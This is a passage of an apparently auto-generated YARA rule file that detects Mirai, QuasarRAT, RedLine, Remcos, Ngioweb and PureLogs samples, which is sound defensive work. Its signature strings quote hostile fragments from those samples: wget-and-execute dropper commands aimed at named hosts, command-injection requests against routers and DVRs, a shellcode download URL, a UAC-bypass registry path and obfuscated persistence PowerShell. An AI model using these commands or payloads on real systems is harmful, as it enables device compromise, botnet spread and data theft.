      $s7 = "Unsupported operation for this format" fullword ascii /* score: '12.00'*/
      $s8 = "Error reading BMP info" fullword ascii /* score: '10.00'*/
      $s9 = "Sainbox COM Services (DCOM)" fullword ascii /* score: '10.00'*/
      $s10 = "Tusk.smf" fullword ascii /* score: '10.00'*/
      $s11 = "Sainbox COM Support" fullword ascii /* score: '10.00'*/
      $s12 = "h* -h]" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule QuasarRAT_signature__a9c887a4f18a3fede2cc29ceea138ed3_imphash_ {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_a9c887a4f18a3fede2cc29ceea138ed3(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "71d675e36d237be76f9141742350f8b2d94d8cefa2b9b3b62622703193c15414"
   strings:
      $s1 = "eHszQSts)" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s2 = "lns:asmv2=\"urn:schemas-microsoft-com:asm.v2\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">" fullword ascii /* score: '13.00'*/
      $s3 = "6+ -x 8yipa9N" fullword ascii /* score: '13.00'*/
      $s4 = "0+ /e?qypux%R" fullword ascii /* score: '12.00'*/
      $s5 = "MvrJp0?- -0r" fullword ascii /* score: '12.00'*/
      $s6 = "<`:Ku5%s$d>!SPYmchon!BbDE" fullword ascii /* score: '12.00'*/
      $s7 = "0OF5kYyc=" fullword ascii /* base64 encoded string  */ /* score: '11.00'*/
      $s8 = "TlrF* Ul.fOj" fullword ascii /* score: '11.00'*/
      $s9 = "( -sk%#<8vh's]\\w:\"}" fullword ascii /* score: '11.00'*/
      $s10 = ")fm0lbFVr" fullword ascii /* base64 encoded string */ /* score: '11.00'*/
      $s11 = "dD09UDRS}" fullword ascii /* base64 encoded string */ /* score: '11.00'*/
      $s12 = "                <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s13 = "yaun.bQm" fullword ascii /* score: '10.00'*/
      $s14 = "5IxJt.gkI" fullword ascii /* score: '10.00'*/
      $s15 = "dx:\\RgTmQo3" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 15000KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6aefcac9 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6aefcac9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6aefcac9b610a002e37fa3be97de13fdb2dda4b9d1ccda8434cd8994e46d297f"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s2 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s3 = "PsTk.exe" fullword wide /* score: '22.00'*/
      $s4 = "users.txt" fullword wide /* score: '22.00'*/
      $s5 = "readlogindata" fullword ascii /* score: '19.00'*/
      $s6 = "get_UsersData" fullword ascii /* score: '17.00'*/
      $s7 = "get_download__1_1" fullword ascii /* score: '15.00'*/
      $s8 = "get_download__1_" fullword ascii /* score: '15.00'*/
      $s9 = "Please select another password ! It's already taken" fullword wide /* score: '15.00'*/
      $s10 = "items.txt" fullword wide /* score: '14.00'*/
      $s11 = "addUsersIntoList" fullword ascii /* score: '12.00'*/
      $s12 = "get_d1dd6ce6a7c22b060352c18cbe9581f3__borders_and_frames_stationary_items" fullword ascii /* score: '12.00'*/
      $s13 = "usersDL" fullword ascii /* score: '12.00'*/
      $s14 = "usersData" fullword ascii /* score: '12.00'*/
      $s15 = "set_UsersData" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule Mirai_signature__f4bac544 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f4bac544.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f4bac5449791b31fe1c79e8052e8d179c1909c292c95d40e03d64f51e32fd744"
   strings:
      $s1 = "Failed to create symlink in %s: %s" fullword ascii /* score: '12.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__f4c6bdb4 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f4c6bdb4.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f4c6bdb49d65df502bfdb4a3eb9101e0a1cf0c3187a23222a72a4b2761dfef7b"
   strings:
      $s1 = "nothinglmao" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 70KB and
      all of them
}

rule Mirai_signature__ff3e70f6 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ff3e70f6.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ff3e70f6c3605e6e410fec31436dba215c6766d086e1cb3e23b2a5cba1eb5b39"
   strings:
      $s1 = "nothinglmao" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      all of them
}

rule Mirai_signature__e33571a6 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e33571a6.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e33571a62bb64341b3951872140c4b4554a7cfbf0901d734274cf12ac861ddfa"
   strings:
      $s1 = "GET /bot.spc HTTP/1.0" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 3KB and
      all of them
}

rule Mirai_signature__f0ccaf55 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f0ccaf55.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f0ccaf55742dffa32d8669a2954bdd1a0d40eb0ab94ced5dd31a7ed3c2bbbf8e"
   strings:
      $s1 = "zl}Jffb`l!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Ngioweb_signature__168459b8 {
   meta:
      description = "_subset_batch - file Ngioweb(signature)_168459b8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "168459b80ce510a16c6c7f3a2e5b90bfa967d4c7c041c50cf1e326ea7e9b0d34"
   strings:
      $s1 = "Host: /octnt-Let-sm" fullword ascii /* score: '13.00'*/
      $s2 = "POSTHTTP/1.1" fullword ascii /* score: '12.00'*/
      $s3 = "tnam/service/sys/passwd" fullword ascii /* score: '10.00'*/
      $s4 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s5 = "Content-Tnnec" fullword ascii /* score: '9.00'*/
      $s6 = "aeiobcdfghklmnprstvx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule QuasarRAT_signature__c6483cddb066c37c14a239b4fed18651_imphash_ {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_c6483cddb066c37c14a239b4fed18651(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c6e92bc1395d1865f41e0d10256f7de0fd6913a07c414b2489a191227b3730f6"
   strings:
      $x1 = "https://github.com/samninja666/1/raw/refs/heads/main/shellcode.bin" fullword ascii /* score: '36.00'*/
      $x2 = "rC:\\Users\\Public\\Documents\\Steam\\CODEX\\374320\\local\\service.exe" fullword wide /* score: '34.00'*/
      $s3 = "taskhostw.exe" fullword ascii /* score: '27.00'*/
      $s4 = "Shellcode Injector" fullword wide /* score: '23.00'*/
      $s5 = "fodhelper.exe" fullword ascii /* score: '22.00'*/
      $s6 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s7 = "Software\\Classes\\ms-settings\\shell\\open\\command" fullword ascii /* score: '13.00'*/
      $s8 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s9 = "runtime error %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__e67c3bba {
   meta:
      description = "_subset_batch - file Mirai(signature)_e67c3bba.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e67c3bbaa143e2ff6a87a9a45c748f3a7adb47ce53cdf5061fb8ab00416575c3"
   strings:
      $s1 = "wget http://siegeville.xyz/arm4; chmod 777 arm4; ./arm4 faith" fullword ascii /* score: '23.00'*/
      $s2 = "wget http://siegeville.xyz/mips; chmod 777 mips; ./mips faith" fullword ascii /* score: '23.00'*/
      $s3 = "wget http://siegeville.xyz/arm7; chmod 777 arm7; ./arm7 faith" fullword ascii /* score: '23.00'*/
      $s4 = "wget http://siegeville.xyz/x86; chmod 777 x86; ./x86 faith" fullword ascii /* score: '23.00'*/
      $s5 = "wget http://siegeville.xyz/mpsl; chmod 777 mpsl; ./mpsl faith" fullword ascii /* score: '23.00'*/
      $s6 = "wget http://siegeville.xyz/arm6; chmod 777 arm6; ./arm6 faith" fullword ascii /* score: '23.00'*/
      $s7 = "wget http://siegeville.xyz/arm5; chmod 777 arm5; ./arm5 faith" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 1KB and
      all of them
}

rule Mirai_signature__e705b6b1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e705b6b1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e705b6b13ce11a5a584be993d9d73492a29023113b869bac1704bc7569da64f9"
   strings:
      $s1 = "SHELL=/bin/sh" fullword ascii /* score: '12.00'*/
      $s2 = "PATH=/home/bin:/home/scripts:/bin:/sbin:/usr/bin:/usr/local/jamvm/bin:/opt/scripts:/usr/sbin" fullword ascii /* score: '12.00'*/
      $s3 = "USER=root" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      all of them
}

rule Mirai_signature__e745fc85 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e745fc85.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e745fc8571ba23f44e6721d8d84c1549a0b286f1f63c8a73e2d14cb55b056bce"
   strings:
      $s1 = "wget http://185.121.13.159/skid.arm -O -> .v; chmod 777 .v; ./.v tbk;" fullword ascii /* score: '27.00'*/
      $s2 = "wget http://185.121.13.159/skid.arm7 -O -> .v; chmod 777 .v; ./.v tbk;" fullword ascii /* score: '24.00'*/
      $s3 = "wget http://185.121.13.159/skid.arm5 -O -> .v; chmod 777 .v; ./.v tbk;" fullword ascii /* score: '24.00'*/
      $s4 = ">/var/tmp/.v && cd /var/tmp" fullword ascii /* score: '11.00'*/
      $s5 = ">/tmp/.v && cd /tmp" fullword ascii /* score: '11.00'*/
      $s6 = ">/home/.v && cd /home" fullword ascii /* score: '11.00'*/
      $s7 = "while read -r line; do case $line in *\\\"/proc/\\\"*) pid=${line##*/proc/}; kill -9 ${pid%% *}; ;; esac; done < /proc/mounts" fullword ascii /* score: '11.00'*/
      $s8 = ">/var/.v && cd /var" fullword ascii /* score: '8.00'*/
      $s9 = ">/dev/shm/.v && cd /dev/shm" fullword ascii /* score: '8.00'*/
      $s10 = ">/dev/.v && cd /dev" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule RemcosRAT_signature__0773304417f7c70530ee6a9c72992f87_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_0773304417f7c70530ee6a9c72992f87(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a4469de201ddfb4d5102a3cfeb04974284a9469074ebe6e4859baead0685154a"
   strings:
      $x1 = "*\\AC:\\Users\\JOHNSON\\AppData\\Roaming\\Microsoft\\Windows\\Templates\\Stub\\Project1.vbp" fullword wide /* score: '38.00'*/
      $s2 = "BMS - System Login Screen" fullword ascii /* score: '23.00'*/
      $s3 = "(Email): helloworld@yahoo.com" fullword ascii /* score: '23.00'*/
      $s4 = "cmdlogin" fullword ascii /* score: '22.00'*/
      $s5 = "firepans.exe" fullword wide /* score: '22.00'*/
      $s6 = "BMS - Change Password Screen" fullword ascii /* score: '20.00'*/
      $s7 = "!wininet@.dll" fullword ascii /* score: '20.00'*/
      $s8 = "txtlogin" fullword ascii /* score: '19.00'*/
      $s9 = "loginbar" fullword ascii /* score: '19.00'*/
      $s10 = "select * from users where loginid = '" fullword wide /* score: '19.00'*/
      $s11 = "51284E47617760614E4267707E7B714E" wide /* score: '19.00'*/ /* hex encoded string 'Q(NGaw`aNBgp~{qN' */
      $s12 = "22222222222222222222222222222222222222222222222222" ascii /* score: '17.00'*/ /* hex encoded string '"""""""""""""""""""""""""' */
      $s13 = "Login ID Does Not Exist! Enter Correct Login ID" fullword wide /* score: '17.00'*/
      $s14 = "3051284E4E457B7C767D65614E414B4146575F21204E717760666077633C776A7730" wide /* score: '17.00'*/ /* hex encoded string '0Q(NNE{|v}eaNAKAFW_! Nqw`f`wc<wjw0' */
      $s15 = "Process@Y)aZ" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 17000KB and
      1 of ($x*) and 4 of them
}

rule Ngioweb_signature__3454e960 {
   meta:
      description = "_subset_batch - file Ngioweb(signature)_3454e960.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3454e960f4c69a1c2f343e655c3bd507531403e9b0563b20f143adfa99886273"
   strings:
      $s1 = "Host: /octet-snt-Lm" fullword ascii /* score: '13.00'*/
      $s2 = "POSTHTTP/1.1" fullword ascii /* score: '12.00'*/
      $s3 = "confsiontoco/res/VER/ver/Ver/reltnam/service/sys/passwd" fullword ascii /* score: '10.00'*/
      $s4 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s5 = "Content-Tnnec" fullword ascii /* score: '9.00'*/
      $s6 = "ghklbcdfaeiomnprstvx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule RemcosRAT_signature_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).xls"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8f9897d6361d82377af0bab38c901136f3b2b435eb804538a039b11e364ae2e8"
   strings:
      $s1 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.4#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE12\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s2 = "https://getabre.com/Mk6wGK" fullword wide /* score: '22.00'*/
      $s3 = "C:\\Program Files\\Microsoft Office\\OFFICE11\\EXCEL.EXE" fullword wide /* score: '21.00'*/
      $s4 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.0#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA6\\VBE6.DLL#Visual Basic For Applicat" wide /* score: '21.00'*/
      $s5 = "HA TINH BRANCH - Vinfast Trading And Production Joint Stock Company@" fullword ascii /* score: '17.00'*/
      $s6 = "13-0000-0000-C000-000000000046}#1.6#0#C:\\Program Files (x86)\\Microsoft Office\\Office12\\EXCEL.EXE#Microsoft Excel 12.0 Object" wide /* score: '17.00'*/
      $s7 = "ALEJANDRO" fullword ascii /* base64 encoded string*/ /* score: '16.50'*/
      $s8 = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" fullword wide /* reversed goodware string 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' */ /* score: '16.50'*/
      $s9 = "DDDDDDDDDDDDDDDDD" wide /* reversed goodware string 'DDDDDDDDDDDDDDDDD' */ /* score: '16.50'*/
      $s10 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\SysWOW64\\stdole2.tlb#OLE Automation" fullword wide /* score: '13.00'*/
      $s11 = "HERRERO - SOLDADOR" fullword ascii /* score: '12.00'*/
      $s12 = "DocumentUserPassword" fullword wide /* score: '12.00'*/
      $s13 = "DocumentOwnerPassword" fullword wide /* score: '12.00'*/
      $s14 = "BOLOGNESI" fullword ascii /* score: '11.50'*/
      $s15 = "CRIZOLOGO" fullword ascii /* score: '11.50'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 4000KB and
      8 of them
}

rule Mirai_signature__f3066dac {
   meta:
      description = "_subset_batch - file Mirai(signature)_f3066dac.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f3066dac46ee802f525dee24dad1d19b0f8d975bb3c59f1b4a80a3f2b6bba9eb"
   strings:
      $s1 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><request version=\"1.0\" systemType=\"NVMS-9000\" clientType=\"WEB\"><types><filterTyp" ascii /* score: '29.00'*/
      $s2 = "GET /cgi-bin/mainfunction.cgi/apmcfgupload?session=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx0" fullword ascii /* score: '24.00'*/
      $s3 = "dressType type=\"addressType\"/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(wget${IFS}http://%d.%d." ascii /* score: '18.00'*/
      $s4 = "%%52$c%%52$cwget${IFS}http://%d.%d.%d.%d/router.draytek.rep.sh${IFS}-O-|sh HTTP/1.0" fullword ascii /* score: '18.00'*/
      $s5 = "POST /editBlackAndWhiteList HTTP/1.0" fullword ascii /* score: '16.00'*/
      $s6 = ".%d/dvr.tvt.rep.sh${IFS}-O-|sh)</ip></item></filterList></content></request>" fullword ascii /* score: '15.00'*/
      $s7 = "__kernel_clock_gettime" fullword ascii /* score: '14.00'*/
      $s8 = "Host: %d.%d.%d.%d" fullword ascii /* score: '12.00'*/
      $s9 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><request version=\"1.0\" systemType=\"NVMS-9000\" clientType=\"WEB\"><types><filterTyp" ascii /* score: '10.00'*/
      $s10 = "Content-Length: 1024" fullword ascii /* score: '9.00'*/
      $s11 = "</types><content><switch>true</switch><filterType type=\"filterTypeMode\">refuse</filterType><filterList type=\"list\"><itemType" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Mirai_signature__fb310d83 {
   meta:
      description = "_subset_batch - file Mirai(signature)_fb310d83.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fb310d83403f6c3b8c0acc30fc4fb0618319666523e24e0be26d460c41fc000c"
   strings:
      $s1 = "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%%20http%%3A//%d.%d.%d.%d/router.tplink.sh%%20-O-%%7C" ascii /* score: '26.00'*/
      $s2 = "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%%20http%%3A//%d.%d.%d.%d/router.tplink.sh%%20-O-%%7C" ascii /* score: '26.00'*/
      $s3 = "Host: %d.%d.%d.%d:80" fullword ascii /* score: '14.50'*/
      $s4 = "__kernel_clock_gettime" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__ea6b585c {
   meta:
      description = "_subset_batch - file Mirai(signature)_ea6b585c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ea6b585ce463a75f91120cdfd5df164904c44d9b58605e12451c9bc46f66a2a1"
   strings:
      $s1 = ":xsvr@M-SEARCH * HTTP" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 60KB and
      all of them
}

rule Mirai_signature__f0f7e39a {
   meta:
      description = "_subset_batch - file Mirai(signature)_f0f7e39a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f0f7e39acd80f1f81760c9afbd33ef622fe3fd4cd7ccec90dbd8a23f41bde7bb"
   strings:
      $s1 = "SEARCH * HTTP/1" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 70KB and
      all of them
}

rule Mirai_signature__ec13e3ad {
   meta:
      description = "_subset_batch - file Mirai(signature)_ec13e3ad.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ec13e3adbdeb378093dc37edb542ff4690d60cd8e762423b5ba6c85e10659116"
   strings:
      $s1 = "zl}Jffb`l!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__f9dd2dc1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f9dd2dc1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f9dd2dc1cb72364fc0877c9c4713fac99393c5995e18ed77e466e7b3bbf30ca8"
   strings:
      $s1 = "zl}Jffb`l!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__fd162317 {
   meta:
      description = "_subset_batch - file Mirai(signature)_fd162317.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fd16231749de882626626664e485e68b1ab7ce5af048da23c6ab3cf4c2643683"
   strings:
      $s1 = "zl}Jffb`l!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule PureLogsStealer_signature_ {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature).ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "23e4c4d1e22fa40ed8a43e3f8639e18efbcc8dc20fc0be0a1ca209748bf9f8bb"
   strings:
      $x1 = "    ${Z`Yz} = \"-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `\"$PSCommandPath`\"\"" fullword ascii /* score: '34.00'*/
      $s2 = "  (  Get-VariABlE  K5N).vaLUE::(\"{2}{1}{0}{3}\" -f 'A','te','Wri','llText').Invoke(\"$d\\ExpeditedAppRegistrations.bat\" , ${cO" ascii /* score: '24.00'*/
      $s3 = "  (  Get-VariABlE  K5N).vaLUE::(\"{2}{1}{0}{3}\" -f 'A','te','Wri','llText').Invoke(\"$d\\ExpeditedAppRegistrations.bat\" , ${cO" ascii /* score: '24.00'*/
      $s4 = "                                    &(\"{3}{1}{2}{0}\"-f '.exe','h','tasks','sc') (\"{1}{0}\"-f'e','/creat') '/sc' (\"{0}{2}{1}" ascii /* score: '22.00'*/
      $s5 = "tas','sNdP','istrations.bat','dWindowsHolographicDriverssNdSpatialStoresNdWiNMSIPCsN','N','dExpeditedAppReg','C:')).\"R`EpLace\"" ascii /* score: '19.00'*/
      $s6 = "    ${Zz`q} = (\"{0}{1}\" -f ${ENV:WINDIR}, \"\\Sysnative\\WindowsPowerShell\\v1.0\\powershell.exe\")" fullword ascii /* score: '19.00'*/
      $s7 = "if ((\"$env:PROCESSOR_ARCHITECTURE\" -eq \"x86\") -and $env:PROCESSOR_ARCHITEW6432) {" fullword ascii /* score: '19.00'*/
      $s8 = "    &(\"{1}{0}\" -f 'Process', 'Start-') -FilePath ${Zz`q} -ArgumentList ${Z`Yz}" fullword ascii /* score: '18.00'*/
      $s9 = " ${K`5N}::(\"{0}{2}{3}{1}\" -f 'W','lText','rite','Al').Invoke(\"$d\\ExpeditedAppRegistrations.ps1\" , ${CoNT`E`Nt})" fullword ascii /* score: '16.00'*/
      $s10 = "Set-Variable -Name xInPi -Value ([Type]::GetType('System.Convert')) ;try {" fullword ascii /* score: '16.00'*/
      $s11 = "      ${PAth} = \"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe\"                                              " ascii /* score: '15.00'*/
      $s12 = "      ${PAth} = \"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe\"                                              " ascii /* score: '15.00'*/
      $s13 = "                                    &(\"{3}{1}{2}{0}\"-f '.exe','h','tasks','sc') (\"{1}{0}\"-f'e','/creat') '/sc' (\"{0}{2}{1}" ascii /* score: '14.00'*/
      $s14 = "(Get-Variable -Name xInPi -ValueOnly)::ToInt32($Bei, 16)" fullword ascii /* score: '13.00'*/
      $s15 = "      ${var1} = ${var1}.${meTHod}('Execute')                                                                                    " ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x6669 and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule Ngioweb_signature__296a28f4 {
   meta:
      description = "_subset_batch - file Ngioweb(signature)_296a28f4.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "296a28f49913ab4f6f2607d7ccb7eba23d14a1298cc21beb5454d393ce402fb3"
   strings:
      $s1 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s2 = "D$ /tmpf" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__b27f6259 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b27f6259.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b27f625907b905e6f97ce169cabafc6933362c28a75b0430584e44ea95b53682"
   strings:
      $s1 = "Zrhy.exe" fullword wide /* score: '22.00'*/
      $s2 = "Zrhy.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Version control systems like Git allow developers to track changes, collaborate effectively, and maintain a complete history of " wide /* score: '13.00'*/
      $s4 = "The best way to learn programming is by practicing regularly, reading other people's code, and constantly challenging yourself w" wide /* score: '12.00'*/
      $s5 = "get_Accuracy" fullword ascii /* score: '9.00'*/
      $s6 = "GetWordCount" fullword ascii /* score: '9.00'*/
      $s7 = "get_TimeElapsed" fullword ascii /* score: '9.00'*/
      $s8 = "(0\\ - " fullword ascii /* score: '9.00'*/
      $s9 = "GetRandomSampleText" fullword ascii /* score: '9.00'*/
      $s10 = "GetCharacterCount" fullword ascii /* score: '9.00'*/
      $s11 = "get_TestDate" fullword ascii /* score: '9.00'*/
      $s12 = "Test Complete!" fullword wide /* score: '9.00'*/
      $s13 = "Programming is not just about writing code; it's about solving problems, creating solutions, and bringing ideas to life through " wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Mirai_signature__eca90ee7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_eca90ee7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eca90ee7b9f5af36ff06b6f2a1d8cb6eb2bfabb1dcf5201f333422643f3d2ceb"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 70KB and
      all of them
}

rule Mirai_signature__f4b3e2ba {
   meta:
      description = "_subset_batch - file Mirai(signature)_f4b3e2ba.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f4b3e2ba51fd8675b88fd97020fe8a47f0ec8e8974ecd8ed5b39bb2b07a7b0b1"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 70KB and
      all of them
}

rule Mirai_signature__ef8944d7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ef8944d7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ef8944d7cee7b707dd6842402e5692a8c96d2918fa8cc7924e5cb607029c06dd"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__f60a6ee0 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f60a6ee0.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f60a6ee0c720e0cc1a002d0e5a317ab8c1e422681ced12d77d4d1eb94800f50c"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__f724167d {
   meta:
      description = "_subset_batch - file Mirai(signature)_f724167d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f724167d63e5a3c12cf92060748c5a0fb3437588222b6be1dfec92548e8784c5"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Ngioweb_signature__531de8fd {
   meta:
      description = "_subset_batch - file Ngioweb(signature)_531de8fd.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "531de8fdeaac5339e297683d9f47d1965067bb9d909d87ba07f7c80649412ebe"
   strings:
      $s1 = "toco/res/VER/ver/Ver/reltnam/service/sys/passwd" fullword ascii /* score: '10.00'*/
      $s2 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s3 = "Host: et-s/octh: " fullword ascii /* score: '9.00'*/
      $s4 = "aeioghklbcdfmnprstvx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Ngioweb_signature__6128a46a {
   meta:
